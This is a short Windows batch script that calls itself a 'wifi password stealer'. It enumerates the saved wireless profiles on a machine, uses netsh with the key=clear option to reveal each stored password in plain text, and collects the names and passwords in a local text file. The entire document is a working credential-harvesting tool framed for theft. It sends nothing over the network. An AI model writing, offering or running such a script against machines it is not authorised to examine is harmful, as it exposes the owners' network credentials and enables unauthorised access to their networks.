


@echo off
REM final wifi password stealer script
setlocal enabledelayedexpansion

REM Store the "netsh wlan show profile" command output in a variable
for /f "tokens=4*" %%A in ('netsh wlan show profile') do (
    set "Profile=%%B"
    REM echo Profile: !Profile!
    
    REM Strings to concatenate
    set "str1=netsh wlan show profile name"
    set "str2=!Profile!"
    set "str3=key"
    set "str4=clear"

    REM Concatenate strings with special characters
    set "concatenatedString=!str1!^="!str2!^" !str3!^=^!str4!"

    REM Execute the concatenatedString as a command and store its output in a file
    REM echo Running command: !concatenatedString!
    !concatenatedString! >> wifinameandpasswd.txt

    echo.
)

REM Display a message indicating the file where the output is saved
echo Output saved to wifinameandpasswd.txt

REM Prompt the user to press Enter to exit
echo Press Enter to exit...
pause > nul

endlocal
